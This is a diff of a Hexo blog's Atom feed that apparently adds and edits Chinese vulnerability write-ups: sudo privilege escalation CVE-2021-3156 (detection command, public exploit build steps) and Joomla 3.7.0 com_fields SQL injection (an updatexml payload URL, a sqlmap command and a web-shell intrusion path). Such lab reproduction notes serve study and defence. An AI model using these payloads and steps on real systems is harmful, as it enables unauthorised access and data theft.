@@ -34,33 +34,13 @@
   </entry>
   
   <entry>
-    <title>Hello World</title>
-    <link href="http://example.com/2021/02/02/hello-world/"/>
-    <id>http://example.com/2021/02/02/hello-world/</id>
-    <published>2021-02-02T11:32:45.171Z</published>
-    <updated>2021-02-02T11:32:45.172Z</updated>
-    
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
     <title>Linux sudo提权(CVE-2021-3156)</title>
     <link href="http://example.com/2021/02/02/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156/"/>
     <id>http://example.com/2021/02/02/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156/</id>
     <published>2021-02-02T09:25:02.000Z</published>
-    <updated>2021-02-02T09:57:15.495Z</updated>
+    <updated>2021-02-04T03:20:11.411Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="Linux-sudo-权限提升-CVE-2021-3156"><a href="#Linux-sudo-权限提升-CVE-2021-3156" class="headerlink" title="Linux sudo 权限提升(CVE-2021-3156)"></a>Linux sudo 权限提升(CVE-2021-3156)</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><blockquote><p>sudo 1.8.2 ~ 1.8.31p2</p><p>sudo 1.9.0 ~ 1.9.5p1</p></blockquote><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>以非 root 用户执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s &#x2F;</span><br></pre></td></tr></table></figure><p>存在漏洞</p><p><img src="../images/image-20210202175040378.png" alt="image-20210202175040378"></p><p>不存在漏洞</p><p><img src="../images/yErg56.png" alt="img"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>工具：<a href="https://github.com/blasty/CVE-2021-3156">https://github.com/blasty/CVE-2021-3156</a></p><p>编译工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2021-3156</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>使用工具</p><p><img src="../images/image-20210202174235752.png" alt="image-20210202174235752"></p><p>提权成功</p><p><img src="../images/image-20210202174316368.png" alt="image-20210202174316368"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复升级到更新版本</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="Linux-sudo-权限提升-CVE-2021-3156"><a href="#Linux-sudo-权限提升-CVE-2021-3156" class="headerlink" title="Linux sudo 权限提升(CVE-2021-3156)"></a>Linux sudo 权限提升(CVE-2021-3156)</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><blockquote><p>sudo 1.8.2 ~ 1.8.31p2</p><p>sudo 1.9.0 ~ 1.9.5p1</p></blockquote><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>以非 root 用户执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s &#x2F;</span><br></pre></td></tr></table></figure><p>存在漏洞</p><p><img src="/images/image-20210202175040378.png" alt="image-20210202175040378"></p><p>不存在漏洞</p><p><img src="/images/yErg56.png" alt="img"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>工具：<a href="https://github.com/blasty/CVE-2021-3156">https://github.com/blasty/CVE-2021-3156</a></p><p>编译工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2021-3156</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>使用工具</p><p><img src="/images/image-20210202174235752.png" alt="image-20210202174235752"></p><p>提权成功</p><p><img src="/images/image-20210202174316368.png" alt="image-20210202174316368"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复升级到更新版本</p>]]></content>
     
     
       
@@ -433,6 +413,28 @@
     <category term="Solr 远程命令执行" scheme="http://example.com/tags/Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
     <category term="CVE-2019-0193" scheme="http://example.com/tags/CVE-2019-0193/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>joomla之sql注入</title>
+    <link href="http://example.com/2019/11/05/joomla%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/"/>
+    <id>http://example.com/2019/11/05/joomla%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/</id>
+    <published>2019-11-05T13:06:27.000Z</published>
+    <updated>2019-11-06T08:12:49.275Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Joomla-3-7-0-Core-com-fields组件SQL注入"><a href="#Joomla-3-7-0-Core-com-fields组件SQL注入" class="headerlink" title="Joomla 3.7.0 Core com_fields组件SQL注入"></a>Joomla 3.7.0 Core com_fields组件SQL注入</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>joomla是国外的一款内容管理系统，属于Portal（企业入口网站）类型，比较适合作为商业类型的网站程序源码。Joomla!采用时下流行的PHP语言和MySQL数据库开发的网站内容管理系统，支持在Linux、Windows和MacOSX等不同的平台上执行，是全球最受欢迎的开源CMS内容管理系统之一。 </p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者可以通过sql注入获取到数据库内所有用户信息，如果数据库权限比较大，攻击者可以直接获取到服务器的权限等。</p><a id="more"></a><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ol><li><p>可以直接用docker：<code>https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917 </code>直接登录<code>http://target:8080/</code>。</p></li><li><p>网站源码：<code>https://github.com/joomla/joomla-cms/releases/download/3.7.0/Joomla_3.7.0-Stable-Full_Package.zip</code></p></li></ol><p>进入安装界面</p><p><img src="/images/1572959299592.png" alt="1572959299592"></p><p><img src="/images/1572959346422.png" alt="1572959346422"></p><p><img src="/images/1572959457487.png" alt="1572959457487"></p><p>确认安装即可。</p><p><img src="/images/1572959503531.png" alt="1572959503531"></p><p>访问主页</p><p><img src="/images/1572963875436.png" alt="1572963875436"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问</p><p><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)</code></p><p><img src="/images/1572963931832.png" alt="1572963931832"></p><p>使用sqlmap直接能跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;10.10.10.24&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml*&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/1573024005832.png" alt="1573024005832"></p><h3 id="进一步渗透思路"><a href="#进一步渗透思路" class="headerlink" title="进一步渗透思路"></a>进一步渗透思路</h3><p>获取网站后台登录的用户名密码  —》 上传shell  –》 菜刀连接</p><p>获取mysql用户名的hash –》 解密  –》 远程连接mysql  –》 写入木马  –》菜刀连接</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li>及时到官网更新最新版本的joomla</li><li>一定要将数据库的用户权限最小化，以免带来更大的危险</li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;Joomla-3-7-0-Core-com-fields组件SQL注入&quot;&gt;&lt;a href=&quot;#Joomla-3-7-0-Core-com-fields组件SQL注入&quot; class=&quot;headerlink&quot; title=&quot;Joomla 3.7.0 Core com_fields组件SQL注入&quot;&gt;&lt;/a&gt;Joomla 3.7.0 Core com_fields组件SQL注入&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;joomla是国外的一款内容管理系统，属于Portal（企业入口网站）类型，比较适合作为商业类型的网站程序源码。Joomla!采用时下流行的PHP语言和MySQL数据库开发的网站内容管理系统，支持在Linux、Windows和MacOSX等不同的平台上执行，是全球最受欢迎的开源CMS内容管理系统之一。 &lt;/p&gt;
+&lt;h3 id=&quot;漏洞危害&quot;&gt;&lt;a href=&quot;#漏洞危害&quot; class=&quot;headerlink&quot; title=&quot;漏洞危害&quot;&gt;&lt;/a&gt;漏洞危害&lt;/h3&gt;&lt;p&gt;攻击者可以通过sql注入获取到数据库内所有用户信息，如果数据库权限比较大，攻击者可以直接获取到服务器的权限等。&lt;/p&gt;</summary>
+    
+    
+    
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+    <category term="joomla" scheme="http://example.com/tags/joomla/"/>
     
   </entry>
   
